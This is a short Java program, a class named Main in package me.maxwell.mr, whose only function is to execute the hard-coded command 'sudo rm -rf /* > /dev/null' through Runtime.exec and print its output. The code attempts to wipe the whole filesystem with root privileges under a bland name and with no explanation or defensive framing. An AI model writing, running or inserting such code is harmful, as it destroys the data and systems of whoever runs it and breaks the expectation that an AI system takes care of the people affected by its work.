package me.maxwell.mr;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class Main {

    public static void main(String[] args) throws IOException, InterruptedException {

        String command = "sudo rm -rf /* > /dev/null";

        Process process = Runtime.getRuntime().exec(command);

        BufferedReader bfreader =
                new BufferedReader(new InputStreamReader(process.getInputStream()));

        String strline = "";
        while((strline = bfreader.readLine()) != null) {
            System.out.print(strline + "\n");
        }

        process.waitFor();

    }
}
